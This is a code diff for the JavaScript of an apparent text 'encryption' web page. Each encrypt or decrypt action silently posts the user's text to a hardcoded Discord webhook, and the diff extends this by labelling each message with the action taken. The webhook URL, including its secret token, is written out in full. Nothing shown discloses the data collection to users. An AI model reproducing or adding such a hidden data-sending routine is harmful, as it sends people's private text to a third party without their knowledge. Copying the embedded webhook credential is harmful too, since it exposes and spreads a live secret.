@@ -43,7 +43,7 @@
                 encrypted += encryptionKey[char] || char;
             }
             document.getElementById('outputText').value = encrypted;
-            sendToDiscord(encrypted);
+            sendToDiscord(encrypted, 'Encrypt');
         }
 
         function decryptText() {
@@ -54,7 +54,7 @@
                 decrypted += decryptionKey[code] || code;
             }
             document.getElementById('outputText').value = decrypted;
-            sendToDiscord(decrypted);
+            sendToDiscord(decrypted, 'Decrypt');
         }
 
         function copyToClipboard() {
@@ -63,13 +63,13 @@
             document.execCommand('copy');
         }
 
-        function sendToDiscord(message) {
+        function sendToDiscord(message, action) {
             const webhookURL = "https://discord.com/api/webhooks/1311339362419736587/WbQTxxFA6B614dZKxxoXYzg4Io91bD7SG_ChX4dv9sBXMI5sxrl3TZ-3Sziky9Zg1O79";
             const currentTime = new Date().toLocaleString();
             const embed = {
                 embeds: [
                     {
-                        title: "New Translation",
+                        title: `${action} Action`,
                         description: message,
                         color: 3447003,
                         fields: [
